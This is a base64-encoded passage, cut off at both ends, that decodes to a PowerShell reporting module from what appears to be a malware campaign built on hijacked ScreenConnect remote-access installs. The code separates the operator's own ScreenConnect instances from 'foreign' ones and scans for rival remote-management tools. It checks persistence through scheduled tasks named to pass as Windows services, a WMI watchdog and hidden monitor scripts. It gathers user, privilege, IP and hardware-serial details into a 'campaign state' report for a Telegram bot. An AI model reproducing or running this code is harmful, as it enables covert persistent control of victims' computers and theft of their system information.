dXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1
bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkZG4gPSAkXy5EaXNw
bGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0KICAgICAgICAgICAg
aWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcq
RGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdrZWVwLWRh
dHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAg
ICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9CiAgICAgICAgICAg
IGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAgICAgIGlmICgkZG4gLWxpa2Ug
IiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4KICAgICAgICAg
ICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7CiAg
ICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJp
bmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJl
LU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVh
Y2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZd
ezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYg
KCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICdLRUVQLVBSSU1BUlknIH0KICAgICAgICBl
bHNlaWYgKCRmcCAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICdLRUVQLUFMVCcgfQogICAgICAg
IGVsc2UgeyAnRk9SRUlHTicgfQogICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gPGNvZGU+ezB9
PC9jb2RlPjogPGI+ezF9PC9iPiBbezJ9XScgLWYgKEVzYyAkXy5OYW1lKSwgKEVzYyAoW3N0cmlu
Z10kXy5TdGF0dXMpKSwgJHRhZykpCiAgICB9CgogICAgJHJvb3RzID0gQCgKICAgICAgICAiJHtl
bnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLAogICAgICAgICIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIgogICAgKQogICAgZm9yZWFj
aCAoJHBhdCBpbiAkcm9vdHMpIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURp
cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsK
ICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBwYXRoOiA8Y29kZT57MH08L2NvZGU+JyAt
ZiAoRXNjICRfLkZ1bGxOYW1lKSkpCiAgICAgICAgfQogICAgfQoKICAgICR1bmluc3QgPSBAKAog
ICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxV
bmluc3RhbGxcKicsCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29m
dFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJwogICAgKQogICAgZm9yZWFjaCAo
JHBhdGggaW4gJHVuaW5zdCkgewogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAkXy5E
aXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJwogICAgICAgIH0gfCBGb3JFYWNoLU9i
amVjdCB7CiAgICAgICAgICAgICR2ZXIgPSBpZiAoJF8uRGlzcGxheVZlcnNpb24pIHsgJF8uRGlz
cGxheVZlcnNpb24gfSBlbHNlIHsgJz8nIH0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgn
LSBtc2k6IDxjb2RlPnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChF
c2MgJHZlcikpKQogICAgICAgIH0KICAgIH0KCiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsg
W3ZvaWRdJGxpc3QuQWRkKCctIChub25lKScpIH0KICAgIHJldHVybiAkbGlzdAp9CgokY2ZnID0g
R2V0LUNmZwppZiAoLW5vdCAkY2ZnLkJPVF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsK
ICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVy
cicpIC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICBleGl0IDIKfQoKJHByaW0gPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1
MmU1MDcpJwokYWx0ID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScK
JG9zID0gR2V0LU9zSW5mbwokd2hvID0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRp
dHldOjpHZXRDdXJyZW50KCkuTmFtZQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJy
ZW50KCkpLklzSW5Sb2xlKAogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJv
bGVdOjpBZG1pbmlzdHJhdG9yKQokaXNTeXN0ZW0gPSAkd2hvIC1saWtlICcqU1lTVEVNKicgLW9y
ICR3aG8gLWVxICdOVCBBVVRIT1JJVFlcU1lTVEVNJwoKJG1zaUNhY2hlID0gSm9pbi1QYXRoICRX
b3JrRGlyICdwa2cubXNpJwokbXNpU2l6ZSA9IGlmIChUZXN0LVBhdGggJG1zaUNhY2hlKSB7CiAg
ICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
QikKfSBlbHNlIHsgJ25vbmUnIH0KCiRtb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25f
bW9uLmNtZCcKJGV0bE1vbiA9ICIkZW52OlByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNc
U3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21kIgokaGFzTW9uID0gVGVzdC1QYXRoICRtb25QYXRo
CiRoYXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbgoKIyBUMTA6IG9uLWRpc2sgcGF5bG9hZCBidWls
ZCBtYXJrZXJzIC0+IGV2ZXJ5IHJlcG9ydCBwcm92ZXMgZXhhY3RseSB3aGF0IGlzIGluc3RhbGxl
ZApmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtzdHJpbmddJGZpbGUpIHsKICAgIGlmICgtbm90
IChUZXN0LVBhdGggJGZpbGUpKSB7IHJldHVybiAnbWlzc2luZycgfQogICAgZm9yZWFjaCAoJGwg
aW4gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkZmlsZSAtVG90YWxDb3VudCA4IC1Gb3JjZSAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICBpZiAoJGwgLW1hdGNoICdC
VUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0Y2hlc1sxXSB9CiAgICB9CiAg
ICByZXR1cm4gJz8nCn0KJGJNb24gPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtE
aXIgJ293bl9tb24uY21kJykKJGJTZWMgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdv
cmtEaXIgJ293bl9zZWN1cmUuY21kJykKJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBh
dGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQokYkxpYiA9IEdldC1QYXlsb2FkQnVpbGQgKEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5wczEnKQoKIyBwZXItaG9zdCBpZGVudGl0eTogZXhw
ZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZyb20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudAokaWRD
ZmcgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycKJGlkTWFwID0gQHt9CmlmIChU
ZXN0LVBhdGggJGlkQ2ZnKSB7CiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGlkQ2ZnIHwg
Rm9yRWFjaC1PYmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9
XHMqKC4rPylccyokJykgeyAkaWRNYXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQogICAg
fQp9CiRleHBlY3RlZFRhc2tzID0gQCgKICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19B
KSB7ICRpZE1hcC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFw
LlRBU0tfQikgeyAkaWRNYXAuVEFTS19CIH0gZWxzZSB7ICdQbGFTZXJ2ZXJIZWFsdGgnIH0pOyBS
b2xlID0gImJhY2t1cCAkKCRpZE1hcC5NT19CKW0gKGNoYWluMSkiIH0sCiAgICBAeyBOYW1lID0g
JChpZiAoJGlkTWFwLlRBU0tfQykgeyAkaWRNYXAuVEFTS19DIH0gZWxzZSB7ICdXZGlIb3N0UHJv
eHknIH0pOyBSb2xlID0gJ09OU1RBUlQgKGNoYWluMSknIH0sCiAgICBAeyBOYW1lID0gJChpZiAo
JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENvbmZsaWN0UmVz
JyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9CikKIyBjaGFpbiAyOiBXTUkgd2F0Y2hk
b2cgc3Vic2NyaXB0aW9uCiR3bWlDID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vi
c2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0n
V3VjYWNoZVdhdGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiRleHBlY3Rl
ZFRhc2tzICs9IEB7IE5hbWUgPSAnXFdNSVxXdWNhY2hlV2F0Y2hkb2dDJzsgUm9sZSA9ICd0aW1l
ciAzbSAoY2hhaW4yKSc7IFdtaSA9ICgkbnVsbCAtbmUgJHdtaUMpIH0KCiR0YXNrTGluZXMgPSBO
ZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQokdGFza09r
ID0gMAokdGFza0JhZCA9IDAKZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsKICAgIGlm
ICgkdC5Db250YWluc0tleSgnV21pJykpIHsKICAgICAgICBpZiAoJHQuV21pKSB7ICR0YXNrT2sr
KzsgJG1hcmsgPSAnT0snIH0gZWxzZSB7ICR0YXNrQmFkKys7ICRtYXJrID0gJ01JU1NJTkcnIH0K
ICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAt
IHsyfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChFc2MgJHQuUm9sZSkpKQogICAgICAgIGNv
bnRpbnVlCiAgICB9CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUKICAgIGlmICgkaC5Q
cmVzZW50IC1hbmQgJGguSGVhbHRoeSkgewogICAgICAgICR0YXNrT2srKwogICAgICAgICRtYXJr
ID0gJ09LJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQgLWFuZCAtbm90ICRoLk91cnMpIHsKICAg
ICAgICAkdGFza0JhZCsrCiAgICAgICAgJG1hcmsgPSAnTk9UX09VUlMnCiAgICB9IGVsc2VpZiAo
JGguUHJlc2VudCkgewogICAgICAgICR0YXNrQmFkKysKICAgICAgICAkbWFyayA9ICdXRUFLJwog
ICAgfSBlbHNlIHsKICAgICAgICAkdGFza0JhZCsrCiAgICAgICAgJG1hcmsgPSAnTUlTU0lORycK
ICAgIH0KICAgICRleHRyYSA9ICcnCiAgICBpZiAoJGguUHJlc2VudCkgewogICAgICAgICRiaXRz
ID0gQCgpCiAgICAgICAgaWYgKCRoLlN0YXR1cykgeyAkYml0cyArPSAkaC5TdGF0dXMgfQogICAg
ICAgIGlmICgkaC5SZXN1bHQgLW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMg
Kz0gKCJMYXN0UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0KICAgICAgICBpZiAoJGJpdHMuQ291bnQp
IHsgJGV4dHJhID0gJyAoJyArICgkYml0cyAtam9pbiAnLCAnKSArICcpJyB9CiAgICB9CiAgICBb
dm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfXszfScg
LWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChFc2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpCn0K
CiRwcmltTGluZSA9IEdldC1TdmNMaW5lICRwcmltCiRhbHRMaW5lID0gR2V0LVN2Y0xpbmUgJGFs
dAokcHJpbU9rID0gJHByaW1MaW5lIC1saWtlICdSdW5uaW5nKicKJGRlcGxveU9rID0gJHByaW1P
ayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24KCiRlbW9qaU1hcCA9IEB7CiAgICBP
SyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4MjcwNSkKICAgIERPV04gICAgID0gKFtzdHJpbmdd
W2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2QTgpKQogICAgUkVTVE9SRUQgPSAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjdFMikpCiAgICBGQUlMICAgICA9IFtzdHJp
bmddKFtjaGFyXTB4Mjc0QykKICAgIEZPUkNFICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNkExKQog
ICAgREVQTE9ZICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkp
CiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUx
KSkKfQoka2V5ID0gJFN0YXRlLlRvVXBwZXJJbnZhcmlhbnQoKQokZW1vamkgPSBpZiAoJGVtb2pp
TWFwLkNvbnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0KCiR0aXRsZSA9IHN3aXRjaCAo
JGtleSkgewogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0aHknIH0KICAgICdET1dOJyB7ICdQcmlt
YXJ5IERPV04gLSBoZWFsaW5nJyB9CiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVTVE9SRUQn
IH0KICAgICdGQUlMJyB7ICdIZWFsIEZBSUxFRCcgfQogICAgJ0ZPUkNFJyB7ICdGb3JjZWQgcmVp
bnN0YWxsJyB9CiAgICAnREVQTE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNUIERFUExPWSBP
SycgfSBlbHNlIHsgJ0ZJUlNUIERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9CiAgICAnSEInIHsg
J2hvdXJseSBkaWdlc3QnIH0KICAgIGRlZmF1bHQgeyAiU3RhdGU6ICRTdGF0ZSIgfQp9CgokdHJh
bnMgPSBpZiAoJE9sZFN0YXRlKSB7ICIkT2xkU3RhdGUgLT4gJFN0YXRlIiB9IGVsc2UgeyAkU3Rh
dGUgfQokc2NMaXN0ID0gR2V0LVNjSW5zdGFsbHMKJHJtbUhpdHMgPSBHZXQtUm1tSGl0cwppZiAo
JHJtbUhpdHMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJHJtbUhpdHMuQWRkKCctIChub25lIGRldGVj
dGVkKScpIH0KCiRwdWIgPSBHZXQtUHVibGljSXAKJGxhbiA9IEdldC1Mb2NhbElwcwokbm93ID0g
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcyB6enonCiR1cHRpbWUgPSAnbi9h
Jwp0cnkgewogICAgJGJvb3QgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5c3Rl
bSkuTGFzdEJvb3RVcFRpbWUKICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1oIHswOm1tfW0n
IC1mICgoR2V0LURhdGUpIC0gJGJvb3QpCn0gY2F0Y2gge30KCiMgY2FtcGFpZ24gc3RhdGUgZmls
ZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBzdGF0ZSBhY3Rpb24pCiRzdGF0ZUxpbmUgPSAnbi9h
Jwokc3RhdGVPYmogPSAkbnVsbAokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3Rh
dGUuanNvbicKaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoMikgewogICAgJHJhd1N0YXRlID0gKEdl
dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoMiAtUmF3KS5UcmltKCkKICAgIHRyeSB7
CiAgICAgICAgJHN0YXRlT2JqID0gJHJhd1N0YXRlIHwgQ29udmVydEZyb20tSnNvbgogICAgICAg
ICRmb3JlaWduQ3N2ID0gaWYgKCRzdGF0ZU9iai5mb3JlaWduKSB7ICgkc3RhdGVPYmouZm9yZWln
biAtam9pbiAnLCcpIH0gZWxzZSB7ICctJyB9CiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQo
JHN0YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3JlaWduQ3N2
XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50YXNrc1RvdGFsKSB3ZD0k
KCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3RhdGVPYmouaW5zdGFsbENvdW50KSIKICAg
IH0gY2F0Y2ggeyAkc3RhdGVMaW5lID0gJHJhd1N0YXRlIH0KfQoKJGRlcGxveUJsb2NrID0gJycK
aWYgKCRrZXkgLWVxICdERVBMT1knKSB7CiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNPTVBMRVRFJyB9
CiAgICAkZm9yZWlnbiA9IEAoR2V0LUNoaWxkSXRlbSAtUGF0aCAiJHtlbnY6UHJvZ3JhbUZpbGVz
fVxTY3JlZW5Db25uZWN0IENsaWVudCoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVu
Q29ubmVjdCBDbGllbnQqIiAtRGlyZWN0b3J5IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwKICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1ub3RtYXRjaCAnNWY2MDEwNTc5ODUy
ZTUwN3xmODYxYzgxNDBkNDUzNDI3JyB9KQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lz
dGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkYm9vdFBhdGggPSBKb2lu
LVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJwogICAgaWYgKFRlc3QtUGF0aCAkYm9vdFBhdGgpIHsK
ICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKAogICAgICAgICAgICAnbXNpXycsICdmZXRjaF8nLCAn
cHJpbWFyeV8nLCAnbnVrZV8nLCAnbXNpX3RvbycsICdtc2lfZmV0Y2gnLCAnbXNpX2V4aXQnLAog
ICAgICAgICAgICAnbXNpX3VuYXZhaWxhYmxlJywgJ3NlY3VyZV8nLCAnZ29fJywgJ2V4dGVybWlu
YXRlXycsICdpZGVudGl0eV8nLAogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycKICAgICAgICAp
CiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRib290UGF0aCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAg
ICAgICAkbGluZSA9ICRfCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3Rp
bmcpIHsgaWYgKCRsaW5lIC1saWtlICIqJHQqIikgeyByZXR1cm4gJHRydWUgfSB9CiAgICAgICAg
ICAgICAgICAkZmFsc2UKICAgICAgICAgICAgfSB8CiAgICAgICAgICAgIFNlbGVjdC1PYmplY3Qg
LUxhc3QgMjYgfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFt2b2lkXSRkaWFnTGluZXMu
QWRkKCgnLSA8Y29kZT57MH08L2NvZGU+JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4
N0VdJywgJz8nKSkpKSB9CiAgICB9CiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEgMCkgeyBb
dm9pZF0kZGlhZ0xpbmVzLkFkZCgnLSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4gYm9vdC5l
cnIpJykgfQogICAgJGRlcGxveUJsb2NrID0gQCIKCjxiPkRlcGxveSB2ZXJkaWN0PC9iPgotIFJl
c3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPgotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHBy
aW1PaykgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pCi0gTW9uaXRvciBzY3JpcHQgKC53dWNhY2hl
XG93bl9tb24uY21kKTogJChpZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pCi0g
QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0bCkgeyAnWUVT
JyB9IGVsc2UgeyAnTk8nIH0pCi0gUGVyc2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVj
dGVkVGFza3MuQ291bnQpIChiYWQvbWlzc2luZzogJHRhc2tCYWQpCi0gTVNJIGNhY2hlOiAkKEVz
YyAkbXNpU2l6ZSkKLSBGb3JlaWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkK
LSBOb3RlOiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4gKG5vcm1hbCByaWdo
dCBhZnRlciBjcmVhdGUpCgo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+CiQoJGRpYWdMaW5lcyAt
am9pbiAiYG4iKQoiQAp9CgokdGV4dCA9IEAiCiRlbW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2Mg
JHRpdGxlKTwvYj4KCjxiPkV2ZW50PC9iPgotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQotIFRy
YW5zaXRpb246IDxjb2RlPiQoRXNjICR0cmFucyk8L2NvZGU+Ci0gV2hlbjogJChFc2MgJG5vdykK
LSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+CiRkZXBsb3lCbG9jawoK
PGI+SG9zdDwvYj4KLSBDb21wdXRlcjogPGNvZGU+JChFc2MgJGVudjpDT01QVVRFUk5BTUUpPC9j
b2RlPgotIFVzZXI6IDxjb2RlPiQoRXNjICR3aG8pPC9jb2RlPgotIEVsZXZhdGVkOiAkZWxldiB8
IFNZU1RFTTogJGlzU3lzdGVtCi0gRG9tYWluL1dvcmtncm91cDogJChFc2MgJG9zLkRvbWFpbikK
CjxiPk5ldHdvcms8L2I+Ci0gTEFOIElQczogPGNvZGU+JChFc2MgJGxhbik8L2NvZGU+Ci0gUHVi
bGljIElQOiA8Y29kZT4kKEVzYyAkcHViKTwvY29kZT4KCjxiPk9TIC8gSGFyZHdhcmU8L2I+Ci0g
T1M6ICQoRXNjICRvcy5DYXB0aW9uKQotIFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVp
bGQgJChFc2MgJG9zLkJ1aWxkKSkgJChFc2MgJG9zLkFyY2gpCi0gSW5zdGFsbDogJChFc2MgJG9z
Lkluc3RhbGxEYXRlKSB8IExhc3QgYm9vdDogJChFc2MgJG9zLkxhc3RCb290KQotIFVwdGltZTog
JChFc2MgJHVwdGltZSkKLSBDUFU6ICQoRXNjICRvcy5DUFUpCi0gSGFyZHdhcmU6ICQoRXNjICRv
cy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5Nb2RlbCkKLSBTZXJpYWw6IDxjb2RlPiQoRXNjICRv
cy5TZXJpYWwpPC9jb2RlPgotIFJBTTogJCgkb3MuVG90YWxSQU1fR0IpIEdCCi0gRGlzayBDOiAk
KCRvcy5EaXNrRnJlZV9HQikgR0IgZnJlZSAvICQoJG9zLkRpc2tTaXplX0dCKSBHQgoKPGI+U2Ny
ZWVuQ29ubmVjdCAoYWxsKTwvYj4KLSBQcmltYXJ5IDxjb2RlPjVmNjAxMDU3OTg1MmU1MDc8L2Nv
ZGU+OiAkKEVzYyAkcHJpbUxpbmUpCi0gQWx0IDxjb2RlPmY4NjFjODE0MGQ0NTM0Mjc8L2NvZGU+
OiAkKEVzYyAkYWx0TGluZSkKJCgkc2NMaXN0IC1qb2luICJgbiIpCgo8Yj5PdGhlciBSTU0gLyBy
ZW1vdGUgdG9vbHM8L2I+CiQoJHJtbUhpdHMgLWpvaW4gImBuIikKCjxiPlBlcnNpc3QgdGFza3Mg
KGV4cGVjdGVkKTwvYj4KJCgkdGFza0xpbmVzIC1qb2luICJgbiIpCgo8Yj5DYWNoZTwvYj4KLSBN
U0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGly
KTwvY29kZT4KCjxiPlBheWxvYWQgYnVpbGRzIChpbnN0YWxsZWQgb24gdGhpcyBob3N0KTwvYj4K
LSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3IgfCBMSUI9JGJMaWI8L2Nv
ZGU+Cgo8Yj5DYW1wYWlnbiBzdGF0ZTwvYj4KLSA8Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29k
ZT4KCjxpPkJvdDogQG5vYnVkZHlybW1Cb3QgfCBUR19SRVBPUlQgJGJUZ3I8L2k+CiJACgojIGNv
bXBhY3QgZGlnZXN0IG1vZGU6IG9uZSBzaG9ydCBsaW5lLCBIVE1MLWZyZWUgKGhvdXJseSBoZWFy
dGJlYXQpCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7CiAgICAkZm9yZWlnbk4gPSAwCiAgICBp
ZiAoJHN0YXRlT2JqIC1hbmQgJHN0YXRlT2JqLmZvcmVpZ24pIHsgJGZvcmVpZ25OID0gQCgkc3Rh
dGVPYmouZm9yZWlnbikuQ291bnQgfQogICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNp
Q2FjaGUpIHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0
